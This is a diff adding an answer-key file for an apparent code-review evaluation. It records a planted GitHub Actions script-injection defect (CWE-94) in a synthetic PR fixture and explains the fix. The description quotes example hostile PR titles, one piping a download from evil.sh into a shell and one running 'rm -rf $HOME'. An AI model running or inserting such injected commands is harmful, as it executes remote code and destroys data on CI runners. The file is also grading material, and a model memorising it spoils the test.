@@ -1,0 +1,18 @@
+# Planted defects this diff.patch contains. Used by the eval harness (Phase 8) to
+# compute recall/precision; for Phase 5 this documents what a correct review of
+# fixtures/synthetic_prs/gha_script_injection/diff.patch must catch.
+findings:
+  - rule_id: CWE-94
+    file: ci/build.yml
+    line_start: 12
+    line_end: 12
+    severity: high
+    description: >
+      The "Greet PR (unsafe)" step interpolates the attacker-controlled
+      ${{ github.event.pull_request.title }} expression directly into the body
+      of a run: shell command. GitHub Actions substitutes the expression before
+      the shell parses the line, so a PR whose title contains shell
+      metacharacters (e.g. "$(curl evil.sh | sh)" or "\"; rm -rf $HOME; #") is
+      executed as commands on the runner. The value must be passed through an
+      env: binding and referenced as a quoted "$VAR" so the shell treats it as
+      data, not code.
